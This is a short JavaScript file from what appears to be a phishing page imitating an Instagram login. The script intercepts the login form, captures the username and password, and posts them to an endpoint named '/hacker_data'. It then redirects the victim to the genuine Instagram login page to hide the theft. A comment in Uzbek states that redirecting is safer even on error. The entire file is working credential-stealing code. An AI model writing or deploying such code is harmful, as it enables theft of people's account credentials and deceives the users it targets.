document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();

    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;

    fetch('/hacker_data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: pass })
    })
        .then(res => res.json())
        .then(data => {
            window.location.href = "https://www.instagram.com/accounts/login/";
        })
        .catch(err => {
            // Xato bo'lsa ham foydalanuvchini yo'naltirish xavfsizroq
            window.location.href = "https://www.instagram.com/accounts/login/";
        });
});